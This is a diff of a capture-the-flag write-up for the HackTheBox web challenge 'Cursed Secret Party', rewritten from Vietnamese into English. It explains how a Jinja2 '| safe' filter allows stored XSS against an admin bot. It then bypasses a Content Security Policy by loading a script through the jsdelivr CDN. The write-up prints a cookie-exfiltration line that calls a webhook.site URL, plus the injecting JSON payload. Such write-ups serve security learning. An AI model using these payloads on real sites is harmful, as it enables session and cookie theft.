@@ -1,12 +1,15 @@
 Cursed Secret Party
 
-# solution
-- Mở đầu là một giao diện có dạng form để điền thông tin
-![alt text](image-1.png)
-- Sau khi bấm nút submti để gửi thì sẽ nhận được tin nhắn "Your request will be reviewed by our team!"
-- Vây là có vẻ sẽ có 1 con bot đọc nội dung mà mình gửi đi.
-- Thử lướt qua source code để tìm từ khóa flag thì ta thấy có đoạn logic xử lý của bot :
-bot.js
+# Solution
+
+## 1. Initial analysis
+
+- The challenge starts with a simple HTML form where users can submit their information.  
+  ![alt text](image-1.png)
+- After submitting the form, the application responds with: `Your request will be reviewed by our team!`.
+- This strongly suggests there is a backend “bot” that reviews submitted requests.
+
+Looking into the source code, we find the bot logic in `bot.js`:
 ```js
 const visit = async () => {
     try {
@@ -40,8 +43,13 @@ const visit = async () => {
     }
 };
 ```
-- Vậy là flag được gán vào trong cookie của bot, mục đích của chúng ta trở nên rõ ràng hơn, đấy là tìm cách lấy được cookie của bot. Mà con bot sẽ xem nội dung chúng ta gửi -> Ý tưởng dùng XSS khá rõ. Ta thử đọc lại flow sau khi submit form xem có lỗi nào không
-- endpoint /api/submit
+
+## 2. Observations
+
+- The bot assigns the flag to a cookie and uses it to access the `/admin` page. Our goal is to retrieve the bot's cookie.
+- Since the bot processes the content we submit, an XSS attack seems feasible.
+
+### Endpoint `/api/submit`
 ```js
 router.post('/api/submit', (req, res) => {
     const { halloween_name, email, costume_type, trick_or_treat } = req.body;
@@ -60,7 +68,8 @@ router.post('/api/submit', (req, res) => {
     return res.status(401).send(response('Please fill out all the required fields!'));
 });
 ```
-- Database function:
+
+### Database functions
 ```js
 async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
 		return new Promise(async (resolve, reject) => {
@@ -84,7 +93,10 @@ async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
 		});
 	}
 ```
-- Rõ ràng sau khi ta submit form, dữ liệu sẽ được lưu lại trên database mà không lọc, sau đó hàm bot.visit() sẽ được gọi, cookie có flag sẽ được tạo, gắn cho bot và truy cập đến trang /admin
+
+- After submitting the form, the data is stored in the database without sanitization. The `bot.visit()` function is then called, creating a cookie with the flag and accessing the `/admin` page.
+
+### Endpoint `/admin`
 ```js
 router.get('/admin', AuthMiddleware, (req, res) => {
     if (req.user.user_role !== 'admin') {
@@ -97,41 +109,19 @@ router.get('/admin', AuthMiddleware, (req, res) => {
         });
 });
 ```
-- Sau đó data từ form mà chúng ta gửi lên sẽ được lấy , chèn sau đó render trực tiếp vào admin.html 
-- Dưới đây là admin.html
-```js
-<html>
-    <head>
-        <link rel="stylesheet" href="/static/css/bootstrap.min.css" />
-        <title>Admin panel</title>
-    </head>
 
-    <body>
-        <div class="container" style="margin-top: 20px">
-            {% for request in requests %} 
-                <div class="card">
-                <div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
-                <div class="card-body">
-                    <p class="card-title"><strong>Email Address</strong>    : {{ request.email }}</p>
-                    <p class="card-text"><strong>Costume Type </strong>   : {{ request.costume_type }} </p>
-                    <p class="card-text"><strong>Prefers tricks or treat </strong>   : {{ request.trick_or_treat }} </p>
-                    <button class="btn btn-primary">Accept</button>
-                    <button class="btn btn-danger">Delete</button>
-                </div>
-            </div>
-            {% endfor %}
-        </div>
+- The data from the form is retrieved and directly rendered into `admin.html`.
 
-    </body>
-</html>
-```
-- Rõ ràng ở đây có lỗi xss ở {{ request.halloween_name | safe }}, giải thích:
-- Trong Flask / Jinja2:
+### Vulnerability in `admin.html`
 
-{{ variable }} → tự động escape
+- There is an XSS vulnerability in `{{ request.halloween_name | safe }}`. Explanation:
+  - In Flask/Jinja2:
+    - `{{ variable }}` → automatically escapes content.
+    - `{{ variable | safe }}` → disables escaping, rendering content directly into HTML.
 
-{{ variable | safe }} → bỏ escape, nội dung được render trực tiếp vào HTML
-- Sau khi test thử một vài payload xss đều không nhận được phản hồi, ta để ý kỹ lại thì thấy web đã bật Content Security Policy (CSP) để chống xss:
+## 3. Exploitation
+
+- Testing various XSS payloads initially failed due to the Content Security Policy (CSP):
 ```js
 app.use(function (req, res, next) {
     res.setHeader(
@@ -141,24 +131,30 @@ app.use(function (req, res, next) {
     next();
 });
 ```
-- Nhưng nó lại cho phép chạy script từ https://cdn.jsdelivr.net , và thật trùng hợp, chúng ta có thể dùng file github qua cdn này với endpoint /gh/user/repo@version/file.js  
-- Tạo file pwn.js trên repo github
+
+- However, the CSP allows scripts from `https://cdn.jsdelivr.net`. Conveniently, GitHub files can be served via this CDN using the endpoint `/gh/user/repo@version/file.js`.
+
+### Steps to exploit
+
+1. Create a `pwn.js` file in a GitHub repository:
 ```js
 window.location = 'https://webhook.site/7752b385-e4e8-4daa-a67a-f14dfcd558ce/cookie=' + document.cookie;
 ```
-- Gửi payload tương ứng
-```json
 
+2. Submit the following payload:
+```json
 {
   "halloween_name":"<script src='https://cdn.jsdelivr.net/gh/d4ngvn/CTF_WRITEUP@main/HackTheBox/Web/Very%20Easy/Cursed%20Secret%20Party/pwn.js'></script>",
   "email":"admin@gmail.cm",
   "costume_type":"monster",
   "trick_or_treat":"tricks"
 }
-
 ```
-![alt text](image-2.png)
-![alt text](image.png)
-- Decode flag 
-![alt text](image-3.png)
+
+3. Observe the results:
+   ![alt text](image-2.png)
+   ![alt text](image.png)
+
+4. Decode the flag:
+   ![alt text](image-3.png)
 
